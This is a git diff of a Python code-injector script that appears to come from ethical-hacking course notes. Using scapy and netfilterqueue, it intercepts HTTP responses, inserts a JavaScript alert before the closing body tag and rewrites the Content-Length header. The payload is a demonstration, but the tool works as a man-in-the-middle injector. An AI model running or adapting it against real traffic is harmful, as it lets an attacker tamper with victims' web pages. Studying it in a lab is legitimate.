@@ -107,6 +107,90 @@
 #     new_packet = set_load(scapy_packet, load)
 #     packet.set_payload(str(new_packet))
 
+#-> Now after refactoring check if the code works fine by going to bing.com and see if alert comes
+
+# 14) If our page has content length and if we insert something in html, webserver will not
+# load the page, since it will think that there is something faulty
+# -> So to insert something in the html code, we need to modify the value of content length
+# in our code and make sure this value corresponds to the latest size of the page
+# after our code injection
+#
+# -> We will user regex expression: Content-Length:\s\d*
+#
+# content_length_search = re.search("Content-Length:\s\d*",load)
+#
+# 15) Since some responses wont contain content length , we need to
+# make sure that the search did not return the result
+# -> we will check if content length search is successful and if successful, create new variable
+# content_length
+# -> We will get from content_length_search.group(0)
+# --> here group(0) means the first thing that you match out of the whole string
+# content_length_search = re.search("Content-Length:\s\d*", load)
+# if content_length_search:
+#     content_length = content_length_search.group(0)
+#     print(content_length)
+
+
+# 16. Now run the 2code-injectorrefactored.py in kali machine  and refresh web page in kali machine now we can see the content length getting printed
+# -> Now we need to separate regular expression into two groups
+# a) group1 - First group is a non capturing group - this group can be used to locate the string which is important for me , But i dont want it to be part of the value that i capture
+# -> to do that in regex we need to put a ? followed by :
+#
+#     content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+#
+# This will tell Python to look for something that is called content length followed by colon, but dont include that in the output you capture
+#
+# b) group2 : now we will be able to access second group  by saying group1
+#
+# if content_length_search:
+#     content_length = content_length_search.group(1)
+#
+#     -> group 1 will only return the actual number: content-length
+#
+# 17. Now if we run the code , we will get only content length number in the output
+# -> This is important because we will be using this number, to recalculate the content length
+#
+# 18) Now cut this: <script>alert('test')</script> and put it in a variable
+#
+# injection_code = "<script>alert('test')</script>"
+# load = load.replace("</body>", injection_code + "</body>")
+#
+# 19) Now calculate the new content length
+#
+# new_content_lenght = content_length + len(injection_code)
+#
+# 20) now change load to account for the new content length
+#
+# if content_length_search:
+#     content_length = content_length_search.group(1)
+# new_content_length = int(content_length) + len(injection_code)
+# load = load.replace(content_length, str(new_content_length))
+#
+# 21) Now we need not reset the packet or set the payload of the packet because this :if statement present already will automatically detect that the load has been modified
+# -> if load has been modified, it will set the payload in my packet to the new load and everything should work as expected
+#
+# if load != scapy_packet[scapy.Raw].load:
+#     new_packet = set_load(scapy_packet, load)
+# packet.set_payload(str(new_packet))
+#
+
+
+# 22) now to test the same, run the file in kali linux and open the browser for winzip.com
+#     -> Now we will be able to see the alert shown in the site
+
+# 23) For situations where a problem: Server may be sending a text or a javascript or a CSS or an image with a content length header
+# -> If it is an image, it will not have a body tag and therefore my javascript will not be injected and i will be having incorrect content length
+# -> Because my code will recalculate the content length assuming that javascript code is injected
+#
+# 24) if we check a http response,
+# -> Response will say that content type is text/html
+# ->We can copy this content type and go to if statement and additional condition for "text/html" is present in load
+#
+# if content_length_search and "text/html" in load:
+
+# 25) Now if we test this again, go to bing.com in kali linux, we can see that alert is thrown
+
+
 #!/usr/bin/env python3
 import netfilterqueue
 import scapy.all as scapy
@@ -134,8 +218,15 @@ def process_packet(packet):
             print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport ==80:
             print("HTTP response")
-            load = load.replace("</body>", "<script>alert('test')</script></body>")
-
+            print(scapy_packet.show())
+            injection_code = "<script>alert('test')</script>"
+            load = load.replace("</body>",injection_code+ "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length)+ len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+                print(content_length)
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet,load )
